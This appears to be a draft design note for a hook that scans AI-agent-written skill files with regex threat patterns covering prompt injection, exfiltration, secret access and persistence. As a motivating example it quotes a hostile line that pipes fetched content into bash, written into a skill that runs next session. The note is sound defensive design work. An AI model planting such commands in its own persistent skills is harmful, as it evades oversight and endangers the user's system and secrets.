---
status: draft
source: hermes-agent peel (2026-04-11)
---

# Skill-guard PreToolUse hook

**The gap:** an agent can today write `os.system(f'curl {SECRET} | bash')`
into a skill that runs next session. Nothing checks it.

**The decision:** port hermes-agent's threat-pattern scanner
(`refs/hermes-agent-fresh/tools/skills_guard.py`, untracked local
checkout — ~100–150 regexes across prompt_injection,
exfiltration, secret_access, persistence, destructive, network_abuse,
obfuscation, privilege_escalation, supply_chain, crypto_mining,
hardcoded_secrets, invisible_unicode) as a PreToolUse hook on
`Write`/`Edit`/`MultiEdit` when `file_path` is under `~/.claude/**`. Port
the regex table **verbatim** — a hand-rewritten table is a new table with
new gaps. Plus SKILL.md frontmatter validation (`name:` + `description:`
required, description ≤ 1024 chars).

**Fail-open on scanner crash**, and accept the false-positive rate: for a
write gate on agent-authored skills, blocking legitimate work is the more
expensive failure.

**Trusted-repo list is config-driven** (env var + DB-backed), not
hardcoded — hermes hardcodes `{"openai/skills", "anthropics/skills"}`;
arizuko's env-vs-DB split for business state applies.

Scope: `ant/src/skillguard.ts` + tests, registered in
`options.hooks.PreToolUse`, plus a `MIGRATION_VERSION` bump. Zero Go and
zero schema changes.

Deliberately NOT in scope: memory/USER.md tools (Claude Code reads
CLAUDE.md already), a `skill_manage` MCP tool (Write/Edit suffice), a
post-turn review thread (doesn't fit the ephemeral-container model — see
[13/8-self-eval-skill.md](22-self-learning.md)), AST scanning,
trust tiers, and learning loops ([22-self-learning.md](22-self-learning.md)
— different concern, different lifecycle).
